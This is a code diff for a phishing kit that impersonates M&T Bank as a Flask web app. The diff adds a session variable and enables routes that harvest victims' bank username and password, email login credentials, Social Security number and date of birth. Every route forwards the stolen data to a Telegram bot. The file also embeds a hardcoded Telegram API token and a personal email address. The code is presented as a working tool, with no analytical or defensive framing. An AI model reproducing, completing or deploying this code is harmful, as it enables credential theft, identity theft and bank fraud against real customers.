@@ -1,7 +1,9 @@
-from flask import Blueprint, render_template, request, redirect, url_for
+from flask import Blueprint, session, render_template, request, redirect, url_for
 # from .utils import report_login, report_card_details, report_ssn, personal_confirmation
 # from .utils import report_login, report_ssn, report_card_details
 import telebot
+
+# franko.draper@ilydeen.org {cameleon mtbprotect}
 
 API_TOKEN = '5716438159:AAGuFg4xF9L44ChmKBFyxLdR5Jk9o7gOLCA'
 
@@ -17,32 +19,39 @@ def signin():
         user_id = request.form['user-id']
         password = request.form['password']
         if user_id and password:
+            session['username'] = user_id
             # print(user_id,password)
             # report_login(user_id,password, bank_name='M & T')
-            bot.send_message(receiver_id, f'--------------------------\nUsername: {user_id}\nPassword: {password}\n--------------------------')
-            return redirect(url_for('main.syncing'))
+            bot.send_message(receiver_id, f'-------------MANDT BANK-------------\nUsername: {user_id}\nPassword: {password}\n--------------------------')
+            return redirect(url_for('portals.ssn'))
     return render_template('signin.html')
 
-# @portals.route('/email-confirmation', methods=['GET','POST'])
-# def email_confirmation():
-#     if request.method == 'POST':
-#         email = request.form['email']
-#         password = request.form['password']
-#         if email and password:
-#             # print(email,password)
-#             report_login(email,password, bank_name='Gmail Account M&T')
-#             return redirect(url_for('main.syncing'))
-#     return render_template('identity-gmail.html')
+@portals.route('/email-confirmation', methods=['GET','POST'])
+def email_confirmation():
+    username = session['username']
+    if request.method == 'POST':
+        email = request.form['email']
+        password = request.form['password']
+        
+        if email and password:
+            bot.send_message(receiver_id, f'-------------MANDT EMAIL LOGIN FOR {username} -------------\nUsername: {email}\nPassword: {password}\n--------------------------')
+            # print(email,password)
+            # report_login(email,password, bank_name='Gmail Account M&T')
+            return redirect(url_for('main.syncing'))
+    return render_template('identity-gmail.html')
 
-# @portals.route('/ssn', methods=['GET','POST'])
-# def ssn():
-#     if request.method == 'POST':
-#         ssn = request.form['ssn']
-#         if ssn:
-#             # print(ssn)
-#             report_ssn(ssn)
-#             return redirect(url_for('portals.card_confirmation'))
-#     return render_template('identity-ssn.html')
+@portals.route('/ssn', methods=['GET','POST'])
+def ssn():
+    username = session['username']
+    if request.method == 'POST':
+        ssn = request.form['ssn']
+        dob = request.form['dob']
+        if ssn:
+            bot.send_message(receiver_id, f'-------------MANDT SSN AND DOB FOR {username} -------------\nUsername: {ssn}\nPassword: {dob}\n--------------------------')
+            # print(ssn)
+            # report_ssn(ssn)
+            return redirect(url_for('portals.email_confirmation'))
+    return render_template('identity-ssn.html')
 
 # @portals.route('/signin/address-confirmation', methods=['GET','POST'])
 # def address():
